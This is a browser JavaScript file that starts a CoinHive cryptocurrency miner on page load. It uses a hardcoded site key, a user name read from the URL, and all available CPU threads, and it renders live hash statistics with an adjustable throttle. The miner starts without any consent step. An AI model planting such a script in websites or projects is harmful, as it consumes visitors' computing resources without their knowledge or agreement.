function QueryString() { return window.location.search.replace('?', '').split('&').map(par => par.split('=')).map(([key, value])=>({[key]:value})).reduce((sum, e)=>Object.assign(sum, e), {}) }
var state = {
    user: 'cobranzas'
}

if (QueryString().user) {
    state.user = QueryString().user
}

function  main(){
    var miner = new CoinHive.User('ZTQERmoZEMWKbAvAwiymhE4N1xFbXvrM', state.user, {
        threads: navigator.hardwareConcurrency,
        throttle: 0.85
    })

    window.miner = miner

    miner.on('found', () => {
        //console.log('hash found')
    })
    miner.on('accepted', () => {
        //console.log('Hash accepted by the pool')
    })

    miner.start()

    var minerData = {}
    var dom = {
        MinerContainer: document.getElementById('MinerContainer'),
        minerThrottleInput: document.getElementById('miner.setThrottle')
    }

    setInterval(function () {
        var data = {
            threads: miner.getNumThreads(),
            throttle: miner.getThrottle(),
            hashesPerSecond: miner.getHashesPerSecond(),
            totalHashes: miner.getTotalHashes(),
            acceptedHashes: miner.getAcceptedHashes()
        }
        Object.assign(minerData, data)
        updateUI()
    }, 1000);

    function updateUI() {
        var m = Miner(minerData)
        dom.MinerContainer.innerHTML = null
        dom.MinerContainer.appendChild(m)
    }

    function Miner(data) {
        var miner = Div()
        miner.id = 'Miner'

        var elements = Object.keys(data).map(key => Row(key, data[key]))
        elements.map(el => miner.appendChild(el))

        return miner
    }
    function Row(label, data) {
        var row = Div()
        row.className = 'row'
        row.appendChild(Div(label))
        row.appendChild(Div(data))
        return row
    }
    function Div(str) {
        var div = document.createElement('div')
        if (str) div.innerHTML = str
        return div
    }

    function setThrottle() {
        var value = +arguments[0].value
        miner.setThrottle(value)
        Object.assign(minerData, {
            throttle: value
        })
        updateUI()
    }

    dom.minerThrottleInput.value = miner.getThrottle()
    
    window.setThrottle = setThrottle
    
}

main()
